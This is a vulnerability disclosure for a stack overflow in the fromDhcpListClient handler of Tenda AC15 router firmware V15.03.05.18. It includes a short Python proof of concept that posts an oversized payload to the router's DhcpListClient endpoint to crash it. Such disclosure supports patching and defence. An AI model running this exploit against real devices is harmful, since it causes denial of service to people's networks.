## Overview

- Firmware download website: https://www.tenda.com.cn/download/detail-2710.html

## Affected version

AC15 V15.03.05.18

## Vulnerability details

The Tenda AC15 V15.03.05.18 firmware has a stack overflow vulnerability in the `fromDhcpListClient` function. We can set `LISTEN=1` and the program will enter line 30 and 33, which leads to a stack overflow vulnerability. Since the overflow overrides the `LISTEN` pointer variable, the `atoi` function will crash the program, causing a DOS attack in the second time looping.

![image-20240314224459210](https://raw.githubusercontent.com/abcdefg-png/images/main/image-20240314224459210.png)

## POC

```python
import requests
from pwn import*

ip = "192.168.84.101"
url = "http://" + ip + "/goform/DhcpListClient"
payload = b"a"*2000


data = {"LISTLEN":1,"page":1,"list1": payload}
response = requests.post(url, data=data)
print(response.text)
```

![image-20240314224519962](https://raw.githubusercontent.com/abcdefg-png/images/main/image-20240314224519962.png)
